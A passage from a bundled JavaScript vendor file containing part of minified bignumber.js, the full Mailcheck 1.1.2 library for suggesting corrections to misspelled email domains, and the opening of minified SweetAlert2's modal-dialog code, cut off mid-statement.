z(this,new B(e,r))<0},t.isLessThanOrEqualTo=t.lte=function(e,r){return-1===(r=z(this,new B(e,r)))||0===r},t.isNaN=function(){return!this.s},t.isNegative=function(){return this.s<0},t.isPositive=function(){return 0<this.s},t.isZero=function(){return!!this.c&&0==this.c[0]},t.minus=function(e,r){var n,t,i,o,s=this,f=s.s;if(r=(e=new B(e,r)).s,!f||!r)return new B(NaN);if(f!=r)return e.s=-r,s.plus(e);var u=s.e/M,l=e.e/M,c=s.c,a=e.c;if(!u||!l){if(!c||!a)return c?(e.s=-r,e):new B(a?s:NaN);if(!c[0]||!a[0])return a[0]?(e.s=-r,e):new B(c[0]?s:3==O?-0:0)}if(u=j(u),l=j(l),c=c.slice(),f=u-l){for((i=(o=f<0)?(f=-f,c):(l=u,a)).reverse(),r=f;r--;i.push(0));i.reverse()}else for(t=(o=(f=c.length)<(r=a.length))?f:r,f=r=0;r<t;r++)if(c[r]!=a[r]){o=c[r]<a[r];break}if(o&&(i=c,c=a,a=i,e.s=-e.s),0<(r=(t=a.length)-(n=c.length)))for(;r--;c[n++]=0);for(r=C-1;f<t;){if(c[--t]<a[t]){for(n=t;n&&!c[--n];c[n]=r);--c[n],c[t]+=C}c[t]-=a[t]}for(;0==c[0];c.splice(0,1),--l);return c[0]?_(e,c,l):(e.s=3==O?-1:1,e.c=[e.e=0],e)},t.modulo=t.mod=function(e,r){var n,t,i=this;return e=new B(e,r),!i.c||!e.s||e.c&&!e.c[0]?new B(NaN):!e.c||i.c&&!i.c[0]?new B(i):(9==o?(t=e.s,e.s=1,n=v(i,e,0,3),e.s=t,n.s*=t):n=v(i,e,0,o),(e=i.minus(n.times(e))).c[0]||1!=o||(e.s=i.s),e)},t.multipliedBy=t.times=function(e,r){var n,t,i,o,s,f,u,l,c,a,h,g,p,w,d,m=this,v=m.c,N=(e=new B(e,r)).c;if(!(v&&N&&v[0]&&N[0]))return!m.s||!e.s||v&&!v[0]&&!N||N&&!N[0]&&!v?e.c=e.e=e.s=null:(e.s*=m.s,v&&N?(e.c=[0],e.e=0):e.c=e.e=null),e;for(t=j(m.e/M)+j(e.e/M),e.s*=m.s,(u=v.length)<(a=N.length)&&(p=v,v=N,N=p,i=u,u=a,a=i),i=u+a,p=[];i--;p.push(0));for(w=C,d=F,i=a;0<=--i;){for(n=0,h=N[i]%d,g=N[i]/d|0,o=i+(s=u);i<o;)n=((l=h*(l=v[--s]%d)+(f=g*l+(c=v[s]/d|0)*h)%d*d+p[o]+n)/w|0)+(f/d|0)+g*c,p[o--]=l%w;p[o]=n}return n?++t:p.splice(0,1),_(e,p,t)},t.negated=function(){var e=new B(this);return e.s=-e.s||null,e},t.plus=function(e,r){var n,t=this,i=t.s;if(r=(e=new B(e,r)).s,!i||!r)return new B(NaN);if(i!=r)return e.s=-r,t.minus(e);var o=t.e/M,s=e.e/M,f=t.c,u=e.c;if(!o||!s){if(!f||!u)return new B(i/0);if(!f[0]||!u[0])return u[0]?e:new B(f[0]?t:0*i)}if(o=j(o),s=j(s),f=f.slice(),i=o-s){for((n=0<i?(s=o,u):(i=-i,f)).reverse();i--;n.push(0));n.reverse()}for((i=f.length)-(r=u.length)<0&&(n=u,u=f,f=n,r=i),i=0;r;)i=(f[--r]=f[r]+u[r]+i)/C|0,f[r]=C===f[r]?0:f[r]%C;return i&&(f=[i].concat(f),++s),_(e,f,s)},t.precision=t.sd=function(e,r){var n,t,i;if(null!=e&&e!==!!e)return H(e,1,q),null==r?r=O:H(r,0,8),D(new B(this),e,r);if(!(n=this.c))return null;if(t=(i=n.length-1)*M+1,i=n[i]){for(;i%10==0;i/=10,t--);for(i=n[0];10<=i;i/=10,t++);}return e&&this.e+1>t&&(t=this.e+1),t},t.shiftedBy=function(e){return H(e,-G,G),this.times("1e"+e)},t.squareRoot=t.sqrt=function(){var e,r,n,t,i,o=this,s=o.c,f=o.s,u=o.e,l=N+4,c=new B("0.5");if(1!==f||!s||!s[0])return new B(!f||f<0&&(!s||s[0])?NaN:s?o:1/0);if((n=0==(f=Math.sqrt(+P(o)))||f==1/0?(((r=$(s)).length+u)%2==0&&(r+="0"),f=Math.sqrt(+r),u=j((u+1)/2)-(u<0||u%2),new B(r=f==1/0?"1e"+u:(r=f.toExponential()).slice(0,r.indexOf("e")+1)+u)):new B(f+"")).c[0])for((f=(u=n.e)+l)<3&&(f=0);;)if(i=n,n=c.times(i.plus(v(o,i,l,1))),$(i.c).slice(0,f)===(r=$(n.c)).slice(0,f)){if(n.e<u&&--f,"9999"!=(r=r.slice(f-3,f+1))&&(t||"4999"!=r)){+r&&(+r.slice(1)||"5"!=r.charAt(0))||(D(n,n.e+N+2,1),e=!n.times(n).eq(o));break}if(!t&&(D(i,i.e+N+2,0),i.times(i).eq(o))){n=i;break}l+=4,f+=4,t=1}return D(n,n.e+N+1,O,e)},t.toExponential=function(e,r){return null!=e&&(H(e,0,q),e++),i(this,e,r,1)},t.toFixed=function(e,r){return null!=e&&(H(e,0,q),e=e+this.e+1),i(this,e,r)},t.toFormat=function(e,r,n){var t;if(null==n)null!=e&&r&&"object"==typeof r?(n=r,r=null):e&&"object"==typeof e?(n=e,e=r=null):n=A;else if("object"!=typeof n)throw Error(I+"Argument not an object: "+n);if(t=this.toFixed(e,r),this.c){var i,o=t.split("."),s=+n.groupSize,f=+n.secondaryGroupSize,u=n.groupSeparator||"",l=o[0],c=o[1],a=this.s<0,h=a?l.slice(1):l,g=h.length;if(f&&(i=s,s=f,g-=f=i),0<s&&0<g){for(i=g%s||s,l=h.substr(0,i);i<g;i+=s)l+=u+h.substr(i,s);0<f&&(l+=u+h.slice(i)),a&&(l="-"+l)}t=c?l+(n.decimalSeparator||"")+((f=+n.fractionGroupSize)?c.replace(new RegExp("\\d{"+f+"}\\B","g"),"$&"+(n.fractionGroupSeparator||"")):c):l}return(n.prefix||"")+t+(n.suffix||"")},t.toFraction=function(e){var r,n,t,i,o,s,f,u,l,c,a,h,g=this,p=g.c;if(null!=e&&(!(f=new B(e)).isInteger()&&(f.c||1!==f.s)||f.lt(w)))throw Error(I+"Argument "+(f.isInteger()?"out of range: ":"not an integer: ")+P(f));if(!p)return new B(g);for(r=new B(w),l=n=new B(w),t=u=new B(w),h=$(p),o=r.e=h.length-g.e-1,r.c[0]=k[(s=o%M)<0?M+s:s],e=!e||0<f.comparedTo(r)?0<o?r:l:f,s=y,y=1/0,f=new B(h),u.c[0]=0;c=v(f,r,0,1),1!=(i=n.plus(c.times(t))).comparedTo(e);)n=t,t=i,l=u.plus(c.times(i=l)),u=i,r=f.minus(c.times(i=r)),f=i;return i=v(e.minus(n),t,0,1),u=u.plus(i.times(l)),n=n.plus(i.times(t)),u.s=l.s=g.s,a=v(l,t,o*=2,O).minus(g).abs().comparedTo(v(u,n,o,O).minus(g).abs())<1?[l,t]:[u,n],y=s,a},t.toNumber=function(){return+P(this)},t.toPrecision=function(e,r){return null!=e&&H(e,1,q),i(this,e,r,2)},t.toString=function(e){var r,n=this,t=n.s,i=n.e;return null===i?t?(r="Infinity",t<0&&(r="-"+r)):r="NaN":(r=null==e?i<=p||d<=i?W($(n.c),i):X($(n.c),i,"0"):10===e?X($((n=D(new B(n),N+i+1,O)).c),n.e,"0"):(H(e,2,S.length,"Base"),a(X($(n.c),i,"0"),10,e,t,!0)),t<0&&n.c[0]&&(r="-"+r)),r},t.valueOf=t.toJSON=function(){return P(this)},t._isBigNumber=!0,null!=r&&B.set(r),B}()).default=r.BigNumber=r,"function"==typeof define&&define.amd?define(function(){return r}):"undefined"!=typeof module&&module.exports?module.exports=r:(e||(e="undefined"!=typeof self&&self?self:window),e.BigNumber=r)}(this);
/* globals define, module, jQuery */

/*
 * Mailcheck https://github.com/mailcheck/mailcheck
 * Author
 * Derrick Ko (@derrickko)
 *
 * Released under the MIT License.
 *
 * v 1.1.2
 */

var Mailcheck = {
  domainThreshold: 2,
  secondLevelThreshold: 2,
  topLevelThreshold: 2,

  defaultDomains: ['msn.com', 'bellsouth.net',
    'telus.net', 'comcast.net', 'optusnet.com.au',
    'earthlink.net', 'qq.com', 'sky.com', 'icloud.com',
    'mac.com', 'sympatico.ca', 'googlemail.com',
    'att.net', 'xtra.co.nz', 'web.de',
    'cox.net', 'gmail.com', 'ymail.com',
    'aim.com', 'rogers.com', 'verizon.net',
    'rocketmail.com', 'google.com', 'optonline.net',
    'sbcglobal.net', 'aol.com', 'me.com', 'btinternet.com',
    'charter.net', 'shaw.ca'],

  defaultSecondLevelDomains: ["yahoo", "hotmail", "mail", "live", "outlook", "gmx"],

  defaultTopLevelDomains: ["com", "com.au", "com.tw", "ca", "co.nz", "co.uk", "de",
    "fr", "it", "ru", "net", "org", "edu", "gov", "jp", "nl", "kr", "se", "eu",
    "ie", "co.il", "us", "at", "be", "dk", "hk", "es", "gr", "ch", "no", "cz",
    "in", "net", "net.au", "info", "biz", "mil", "co.jp", "sg", "hu", "uk"],

  run: function(opts) {
    opts.domains = opts.domains || Mailcheck.defaultDomains;
    opts.secondLevelDomains = opts.secondLevelDomains || Mailcheck.defaultSecondLevelDomains;
    opts.topLevelDomains = opts.topLevelDomains || Mailcheck.defaultTopLevelDomains;
    opts.distanceFunction = opts.distanceFunction || Mailcheck.sift4Distance;

    var defaultCallback = function(result){ return result; };
    var suggestedCallback = opts.suggested || defaultCallback;
    var emptyCallback = opts.empty || defaultCallback;

    var result = Mailcheck.suggest(Mailcheck.encodeEmail(opts.email), opts.domains, opts.secondLevelDomains, opts.topLevelDomains, opts.distanceFunction);

    return result ? suggestedCallback(result) : emptyCallback();
  },

  suggest: function(email, domains, secondLevelDomains, topLevelDomains, distanceFunction) {
    email = email.toLowerCase();

    var emailParts = this.splitEmail(email);

    if (secondLevelDomains && topLevelDomains) {
        // If the email is a valid 2nd-level + top-level, do not suggest anything.
        if (secondLevelDomains.indexOf(emailParts.secondLevelDomain) !== -1 && topLevelDomains.indexOf(emailParts.topLevelDomain) !== -1) {
            return false;
        }
    }

    var closestDomain = this.findClosestDomain(emailParts.domain, domains, distanceFunction, this.domainThreshold);

    if (closestDomain) {
      if (closestDomain == emailParts.domain) {
        // The email address exactly matches one of the supplied domains; do not return a suggestion.
        return false;
      } else {
        // The email address closely matches one of the supplied domains; return a suggestion
        return { address: emailParts.address, domain: closestDomain, full: emailParts.address + "@" + closestDomain };
      }
    }

    // The email address does not closely match one of the supplied domains
    var closestSecondLevelDomain = this.findClosestDomain(emailParts.secondLevelDomain, secondLevelDomains, distanceFunction, this.secondLevelThreshold);
    var closestTopLevelDomain    = this.findClosestDomain(emailParts.topLevelDomain, topLevelDomains, distanceFunction, this.topLevelThreshold);

    if (emailParts.domain) {
      closestDomain = emailParts.domain;
      var rtrn = false;

      if(closestSecondLevelDomain && closestSecondLevelDomain != emailParts.secondLevelDomain) {
        // The email address may have a mispelled second-level domain; return a suggestion
        closestDomain = closestDomain.replace(emailParts.secondLevelDomain, closestSecondLevelDomain);
        rtrn = true;
      }

      if(closestTopLevelDomain && closestTopLevelDomain != emailParts.topLevelDomain && emailParts.secondLevelDomain !== '') {
        // The email address may have a mispelled top-level domain; return a suggestion
        closestDomain = closestDomain.replace(new RegExp(emailParts.topLevelDomain + "$"), closestTopLevelDomain);
        rtrn = true;
      }

      if (rtrn) {
        return { address: emailParts.address, domain: closestDomain, full: emailParts.address + "@" + closestDomain };
      }
    }

    /* The email address exactly matches one of the supplied domains, does not closely
     * match any domain and does not appear to simply have a mispelled top-level domain,
     * or is an invalid email address; do not return a suggestion.
     */
    return false;
  },

  findClosestDomain: function(domain, domains, distanceFunction, threshold) {
    threshold = threshold || this.topLevelThreshold;
    var dist;
    var minDist = Infinity;
    var closestDomain = null;

    if (!domain || !domains) {
      return false;
    }
    if(!distanceFunction) {
      distanceFunction = this.sift4Distance;
    }

    for (var i = 0; i < domains.length; i++) {
      if (domain === domains[i]) {
        return domain;
      }
      dist = distanceFunction(domain, domains[i]);
      if (dist < minDist) {
        minDist = dist;
        closestDomain = domains[i];
      }
    }

    if (minDist <= threshold && closestDomain !== null) {
      return closestDomain;
    } else {
      return false;
    }
  },

  sift4Distance: function(s1, s2, maxOffset) {
    // sift4: https://siderite.blogspot.com/2014/11/super-fast-and-accurate-string-distance.html
    if (maxOffset === undefined) {
        maxOffset = 5; //default
    }

    if (!s1||!s1.length) {
        if (!s2) {
            return 0;
        }
        return s2.length;
    }

    if (!s2||!s2.length) {
        return s1.length;
    }

    var l1=s1.length;
    var l2=s2.length;

    var c1 = 0;  //cursor for string 1
    var c2 = 0;  //cursor for string 2
    var lcss = 0;  //largest common subsequence
    var local_cs = 0; //local common substring
    var trans = 0;  //number of transpositions ('ab' vs 'ba')
    var offset_arr=[];  //offset pair array, for computing the transpositions

    while ((c1 < l1) && (c2 < l2)) {
        if (s1.charAt(c1) == s2.charAt(c2)) {
            local_cs++;
            var isTrans=false;
            //see if current match is a transposition
            var i=0;
            while (i<offset_arr.length) {
                var ofs=offset_arr[i];
                if (c1<=ofs.c1 || c2 <= ofs.c2) {
                    // when two matches cross, the one considered a transposition is the one with the largest difference in offsets
                    isTrans=Math.abs(c2-c1)>=Math.abs(ofs.c2-ofs.c1);
                    if (isTrans)
                    {
                        trans++;
                    } else
                    {
                        if (!ofs.trans) {
                            ofs.trans=true;
                            trans++;
                        }
                    }
                    break;
                } else {
                    if (c1>ofs.c2 && c2>ofs.c1) {
                        offset_arr.splice(i,1);
                    } else {
                        i++;
                    }
                }
            }
            offset_arr.push({
                c1:c1,
                c2:c2,
                trans:isTrans
            });
        } else {
            lcss+=local_cs;
            local_cs=0;
            if (c1!=c2) {
                c1=c2=Math.min(c1,c2);  //using min allows the computation of transpositions
            }
            //if matching characters are found, remove 1 from both cursors (they get incremented at the end of the loop)
            //so that we can have only one code block handling matches 
            for (var j = 0; j < maxOffset && (c1+j<l1 || c2+j<l2); j++) {
                if ((c1 + j < l1) && (s1.charAt(c1 + j) == s2.charAt(c2))) {
                    c1+= j-1; 
                    c2--;
                    break;
                }
                if ((c2 + j < l2) && (s1.charAt(c1) == s2.charAt(c2 + j))) {
                    c1--;
                    c2+= j-1;
                    break;
                }
            }
        }
        c1++;
        c2++;
        // this covers the case where the last match is on the last token in list, so that it can compute transpositions correctly
        if ((c1 >= l1) || (c2 >= l2)) {
            lcss+=local_cs;
            local_cs=0;
            c1=c2=Math.min(c1,c2);
        }
    }
    lcss+=local_cs;
    return Math.round(Math.max(l1,l2)- lcss +trans); //add the cost of transpositions to the final result
  },

  splitEmail: function(email) {
	email = email !== null ? (email.replace(/^\s*/, '').replace(/\s*$/, '')) : null; // trim() not exist in old IE!
    var parts = email.split('@');

    if (parts.length < 2) {
      return false;
    }

    for (var i = 0; i < parts.length; i++) {
      if (parts[i] === '') {
        return false;
      }
    }

    var domain = parts.pop();
    var domainParts = domain.split('.');
    var sld = '';
    var tld = '';

    if (domainParts.length === 0) {
      // The address does not have a top-level domain
      return false;
    } else if (domainParts.length == 1) {
      // The address has only a top-level domain (valid under RFC)
      tld = domainParts[0];
    } else {
      // The address has a domain and a top-level domain
      sld = domainParts[0];
      for (var j = 1; j < domainParts.length; j++) {
        tld += domainParts[j] + '.';
      }
      tld = tld.substring(0, tld.length - 1);
    }

    return {
      topLevelDomain: tld,
      secondLevelDomain: sld,
      domain: domain,
      address: parts.join('@')
    };
  },

  // Encode the email address to prevent XSS but leave in valid
  // characters, following this official spec:
  // http://en.wikipedia.org/wiki/Email_address#Syntax
  encodeEmail: function(email) {
    var result = encodeURI(email);
    result = result.replace('%20', ' ').replace('%25', '%').replace('%5E', '^')
                   .replace('%60', '`').replace('%7B', '{').replace('%7C', '|')
                   .replace('%7D', '}');
    return result;
  }
};

// Export the mailcheck object if we're in a CommonJS env (e.g. Node).
// Modeled off of Underscore.js.
if (typeof module !== 'undefined' && module.exports) {
    module.exports = Mailcheck;
}

// Support AMD style definitions
// Based on jQuery (see http://stackoverflow.com/a/17954882/1322410)
if (typeof define === "function" && define.amd) {
  define("mailcheck", [], function() {
    return Mailcheck;
  });
}

if (typeof window !== 'undefined' && window.jQuery) {
  (function($){
    $.fn.mailcheck = function(opts) {
      var self = this;
      if (opts.suggested) {
        var oldSuggested = opts.suggested;
        opts.suggested = function(result) {
          oldSuggested(self, result);
        };
      }

      if (opts.empty) {
        var oldEmpty = opts.empty;
        opts.empty = function() {
          oldEmpty.call(null, self);
        };
      }

      opts.email = this.val();
      Mailcheck.run(opts);
    };
  })(jQuery);
}

!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):e.Sweetalert2=t()}(this,function(){"use strict";var e={title:"",titleText:"",text:"",html:"",type:null,customClass:"",target:"body",animation:!0,allowOutsideClick:!0,allowEscapeKey:!0,allowEnterKey:!0,showConfirmButton:!0,showCancelButton:!1,preConfirm:null,confirmButtonText:"OK",confirmButtonAriaLabel:"",confirmButtonColor:"",confirmButtonClass:null,cancelButtonText:"Cancel",cancelButtonAriaLabel:"",cancelButtonColor:"#aaa",cancelButtonClass:null,buttonsStyling:!0,reverseButtons:!1,focusConfirm:!0,focusCancel:!1,showCloseButton:!1,closeButtonAriaLabel:"Close this dialog",showLoaderOnConfirm:!1,imageUrl:null,imageWidth:null,imageHeight:null,imageAlt:"",imageClass:null,timer:null,width:500,padding:20,background:"#fff",input:null,inputPlaceholder:"",inputValue:"",inputOptions:{},inputAutoTrim:!0,inputClass:null,inputAttributes:{},inputValidator:null,grow:!1,position:"center",progressSteps:[],currentProgressStep:null,progressStepsDistance:"40px",onBeforeOpen:null,onOpen:null,onClose:null,useRejections:!0},t=function(e){var t={};for(var n in e)t[e[n]]="swal2-"+e[n];return t},n=t(["container","shown","iosfix","modal","overlay","fade","show","hide","noanimation","close","title","content","buttonswrapper","confirm","cancel","icon","image","input","file","range","select","radio","checkbox","textarea","inputerror","validationerror","progresssteps","activeprogressstep","progresscircle","progressline","loading","styled","top","top-left","top-right","center","center-left","center-right","bottom","bottom-left","bottom-right","grow-row","grow-column","grow-fullscreen"]),o=t(["success","warning","info","question","error"]),r=function(e,t){(e=String(e).replace(/[^0-9a-f]/gi,"")).length<6&&(e=e[0]+e[0]+e[1]+e[1]+e[2]+e[2]),t=t||0;for(var n="#",o=0;o<3;o++){var r=parseInt(e.substr && e.substr(2*o,2),16);n+=("00"+(r=Math.round(Math.min(Math.max(0,r+r*t),255)).toString(16))).substr(r.length)}return n},i=function(e){var t=[];for(var n in e)-1===t.indexOf(e[n])&&t.push(e[n]);return t},a=function(e){console.warn("SweetAlert2: "+e)},l=function(e){console.error("SweetAlert2: "+e)},s={previousWindowKeyDown:null,previousActiveElement:null,previousBodyPadding:null},u=function(e){var t=d();t&&t.parentNode.removeChild(t);{if("undefined"!=typeof document){var o=document.createElement("div");o.className=n.container,o.innerHTML=c,("string"==typeof e.target?document.querySelector(e.target):e.target).appendChild(o);var r=p(),i=L(r,n.input),a=L(r,n.file),s=r.querySelector("."+n.range+" input"),u=r.querySelector("."+n.range+" output"),f=L(r,n.select),m=r.querySelector("."+n.checkbox+" input"),v=L(r,n.textarea);return i.oninput=function(){J.resetValidationError()},a.onchange=function(){J.resetValidationError()},s.oninput=function(){J.resetValidationError(),u.value=s.value},s.onchange=function(){J.resetValidationError(),s.previousSibling.value=s.value},f.onchange=function(){J.resetValidationError()},m.onchange=function(){J.resetValidationError()},v.oninput=function(){J.resetValidationError()},r}l("SweetAlert2 requires document to initialize")}},c=('\n <div role="dialog" aria-modal="true" aria-labelledby="'+n.title+'" aria-describedby="'+n.content+'" class="'+n.modal+'" tabindex="-1">\n   <ul class="'+n.progresssteps+'"></ul>\n   <div class="'+n.icon+" "+o.error+'">\n     <span class="swal2-x-mark"><span class="swal2-x-mark-line-left"></span><span class="swal2-x-mark-line-right"></span></span>\n   </div>\n   <div class="'+n.icon+" "+o.question+'">?</div>\n   <div class="'+n.icon+" "+o.warning+'">!</div>\n   <div class="'+n.icon+" "+o.info+'">i</div>\n   <div class="'+n.icon+" "+o.success+'">\n     <div class="swal2-success-circular-line-left"></div>\n     <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n     <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n     <div class="swal2-success-circular-line-right"></div>\n   </div>\n   <img class="'+n.image+'" />\n   <h2 class="'+n.title+'" id="'+n.title+'"></h2>\n   <div id="'+n.content+'" class="'+n.content+'"></div>\n   <input class="'+n.input+'" />\n   <input type="file" class="'+n.file+'" />\n   <div class="'+n.range+'">\n     <output></output>\n     <input type="range" />\n   </div>\n   <select class="'+n.select+'"></select>\n   <div class="'+n.radio+'"></div>\n   <label for="'+n.checkbox+'" class="'+n.checkbox+'">\n     <input type="checkbox" />\n   </label>\n   <textarea class="'+n.textarea+'"></textarea>\n   <div class="'+n.validationerror+'" id="'+n.validationerror+'"></div>\n   <div class="'+n.buttonswrapper+'">\n     <button type="button" class="'+n.confirm+'">OK</button>\n     <button type="button" class="'+n.cancel+'">Cancel</button>\n   </div>\n   <button type="button" class="'+n.close+'">×</button>\n </div>\n').replace(/(^|\n)\s*/g,""),d=function(){return document.body.querySelector("."+n.container)},p=function(){return d()?d().querySelector("."+n.modal):null},f=function(){return p().querySelectorAll("."+n.icon)},m=function(e){return d()?d().querySelector("."+e):null},v=function(){return m(n.title)},g=function(){return m(n.content)},h=function(){return m(n.image)},b=function(){return m(n.progresssteps)},y=function(){return m(n.validationerror)},w=function(){return m(n.confirm)},C=function(){return m(n.cancel)},k=function(){return m(n.buttonswrapper)},x=function(){return m(n.close)},S=function(){var e=Array.from(p().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort(function(e,t){return e=parseInt(e.getAttribute("tabindex")),t=parseInt(t.getAttribute("tabindex")),e>t?1:e<t?-1:0}),t=Array.prototype.slice.call(p().querySelectorAll('button, input:not([type=hidden]), textarea, select, a, [tabindex="0"]'));return i(e.concat(t))},A=function(e,t){return!!e.classList&&e.classList.contains(t)},B=function(e){if(e.focus(),"file"!==e.type){var t=e.value;e.value="",e.value=t}},E=function(e,t){e&&t&&t.split(/\s+/).filter(Boolean).forEach(function(t){e.classList.add(t)})},P=function(e,t){e&&t&&t.split(/\s+/).filter(Boolean).forEach(function(t){e.classList.remove(t)})},L=function(e,t){for(var n=0;n<e.childNodes.length;n++)if(A(e.childNodes[n],t))return e.childNodes[n]},T=function(e,t){t||(t="block"),e.style.opacity="",e.style.display=t},q=function(e){e.style.opacity="",e.style.display="none"},V=function(e){for(;e.firstChild;)e.removeChild(e.firstChild)},M=function(e){return e.offsetWidth||e.offsetHeight||e.getClientRects().length},O=function(e,t){e.style.removeProperty?e.style.removeProperty(t):e.style.removeAttribute(t)},H=function(){var e=document.createElement("div"),t={WebkitAnimation:"webkitAnimationEnd",OAnimation:"oAnimationEnd oanimationend",animation:"animationend"};for(var n in t)if(t.hasOwnProperty(n)&&void 0!==e.style[n])return t[n];return!1}(),N=function(){if(window.onkeydown=s.previousWindowKeyDown,s.previousActiveElement&&s.previousActiveElement.focus){var e=window.scrollX,t=window.scrollY;s.previousActiveElement.focus(),e&&t&&window.scrollTo(e,t)}},j=function(){if("ontouchstart"in window||navigator.msMaxTouchPoints)return 0;var e=document.createElement("div");e.style.width="50px",e.style.height="50px",e.style.overflow="scroll",document.body.appendChild(e);var t=e.offsetWidth-e.clientWidth;return document.body.removeChild(e),t},I=function(e,t){var n=void 0;return function(){clearTimeout(n),n=setTimeout(function(){n=null,e()},t)}},R="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},D=(function(){function e(e){this.value=e}function t(t){function n(r,i){try{var a=t[r](i),l=a.value;l instanceof e?Promise.resolve(l.value).then(function(e){n("next",e)},function(e){n("throw",e)}):o(a.done?"return":"normal",a.value)}catch(e){o("throw",e)}}function o(e,t){switch(e){case"return":r.resolve({value:t,done:!0});break;case"throw":r.reject(t);break;default:r.resolve({value:t,done:!1})}(r=r.next)?n(r.key,r.arg):i=null}var r,i;this._invoke=function(e,t){return new Promise(function(o,a){var l={key:e,arg:t,resolve:o,reject:a,next:null};i?i=i.next=l:(r=i=l,n(e,t))})},"function"!=typeof t.return&&(this.return=void 0)}"function"==typeof Symbol&&Symbol.asyncIterator&&(t.prototype[Symbol.asyncIterator]=function(){return this}),t.prototype.next=function(e){return this._invoke("next",e)},t.prototype.throw=function(e){return this._invoke("throw",e)},t.prototype.return=function(e){return this._invoke("return",e)}}(),Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var o in n)Object.prototype.hasOwnProperty.call(n,o)&&(e[o]=n[o])}return e}),U=D({},e),W=[],K=void 0;"undefined"==typeof Promise&&l("This package requires a Promise library, please include a shim to enable it in this browser (See: https://github.com/limonte/sweetalert2/wiki/Migration-from-SweetAlert-to-SweetAlert2#1-ie-support)");var z=function(e){("string"==typeof e.target&&!document.querySelector(e.target)||"string"!=typeof e.target&&!e.target.appendChild)&&(a('Target parameter is not valid, defaulting to "body"'),e.target="body");var t=void 0,r=p(),i="string"==typeof e.target?document.querySelector(e.target):e.target;t=r&&i&&r.parentNode!==i.parentNode?u(e):r||u(e);for(var s in e)J.isValidParameter(s)||a('Unknown parameter "'+s+'"');t.style.width="number"==typeof e.width?e.width+"px":e.width,t.style.padding=e.padding+"px",t.style.background=e.background;for(var c=t.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix"),m=0;m<c.length;m++)c[m].style.background=e.background;var y=d(),S=v(),A=g(),B=k(),L=w(),M=C(),H=x();if(e.titleText?S.innerText=e.titleText:S.innerHTML=e.title.split("\n").join("<br />"),e.text||e.html){if("object"===R(e.html))if(A.innerHTML="",0 in e.html)for(var N=0;N in e.html;N++)A.appendChild(e.html[N].cloneNode(!0));else A.appendChild(e.html.cloneNode(!0));else e.html?A.innerHTML=e.html:e.text&&(A.textContent=e.text);T(A)}else q(A);if(e.position in n&&E(y,n[e.position]),e.grow&&"string"==typeof e.grow){var j="grow-"+e.grow;j in n&&E(y,n[j])}e.showCloseButton?(H.setAttribute("aria-label",e.closeButtonAriaLabel),T(H)):q(H),t.className=n.modal,e.customClass&&E(t,e.customClass);var I=b(),D=parseInt(null===e.currentProgressStep?J.getQueueStep():e.currentProgressStep,10);e.progressSteps.length?(T(I),V(I),D>=e.progressSteps.length&&a("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"),e.progressSteps.forEach(function(t,o){var r=document.createElement("li");if(E(r,n.progresscircle),r.innerHTML=t,o===D&&E(r,n.activeprogressstep),I.appendChild(r),o!==e.progressSteps.length-1){var i=document.createElement("li");E(i,n.progressline),i.style.width=e.progressStepsDistance,I.appendChild(i)}})):q(I);for(var U=f(),W=0;W<U.length;W++)q(U[W]);if(e.type){var K=!1;for(var z in o)if(e.type===z){K=!0;break}if(!K)return l("Unknown alert type: "+e.type),!1;var _=t.querySelector("."+n.icon+"."+o[e.type]);if(T(_),e.animation)switch(e.type){case"success":E(_,"swal2-animate-success-icon"),E(_.querySelector(".swal2-success-line-tip"),"swal2-animate-success-line-tip"),E(_.querySelector(".swal2-success-line-long"),"swal2-animate-success-line-long");break;case"error":E(_,"swal2-animate-error-icon"),E(_.querySelector(".swal2-x-mark"),"swal2-animate-x-mark")}}var Z=h();e.imageUrl?(Z.setAttribute("src",e.imageUrl),Z.setAttribute("alt",e.imageAlt),T(Z),e.imageWidth?Z.setAttribute("width",e.imageWidth):Z.removeAttribute("width"),e.imageHeight?Z.setAttribute("height",e.imageHeight):Z.removeAttribute("height"),Z.className=n.image,e.imageClass&&E(Z,e.imageClass)):q(Z),e.showCancelButton?M.style.display="inline-block":q(M),e.showConfirmButton?O(L,"display"):q(L),e.showConfirmButton||e.showCancelButton?T(B):q(B),L.innerHTML=e.confirmButtonText,M.innerHTML=e.cancelButtonText,L.setAttribute("aria-label",e.confirmButtonAriaLabel),M.setAttribute("aria-label",e.cancelButtonAriaLabel),e.buttonsStyling&&(L.style.backgroundColor=e.confirmButtonColor,M.style.backgroundColor=e.cancelButtonColor),L.className=n.confirm,E(L,e.confirmButtonClass),M.className=n.cancel,E(M,e.cancelButtonClass),e.buttonsStyling?(E(L,n.styled),E(M,n.styled)):(P(L,n.styled),P(M,n.styled),L.style.backgroundColor=L.style.borderLeftColor=L.style.borderRightColor="",M.style.backgroundColor=M.style.borderLeftColor=M.style.borderRightColor=""),!0===e.animation?P(t,n.noanimation):E(t,n.noanimation),e.showLoaderOnConfirm&&!e.preConfirm&&a("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://limonte.github.io/sweetalert2/#ajax-request")},_=function(e,t,o){var r=d(),i=p();null!==t&&"function"==typeof t&&t(i),e?(E(i,n.show),E(r,n.fade),P(i,n.hide)):P(i,n.fade),T(i),r.style.overflowY="hidden",H&&!A(i,n.noanimation)?i.addEventListener(H,function e(){i.removeEventListener(H,e),r.style.overflowY="auto"}):r.style.overflowY="auto",E(document.documentElement,n.shown),E(document.body,n.shown),E(r,n.shown),Z(),Y(),s.previousActiveElement=document.activeElement,null!==o&&"function"==typeof o&&setTimeout(function(){o(i)})},Z=function(){null===s.previousBodyPadding&&document.body.scrollHeight>window.innerHeight&&(s.previousBodyPadding=document.body.style.paddingRight,document.body.style.paddingRight=j()+"px")},Q=function(){null!==s.previousBodyPadding&&(document.body.style.paddingRight=s.previousBodyPadding,s.previousBodyPadding=null)},Y=function(){if(/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream&&!A(document.body,n.iosfix)){var 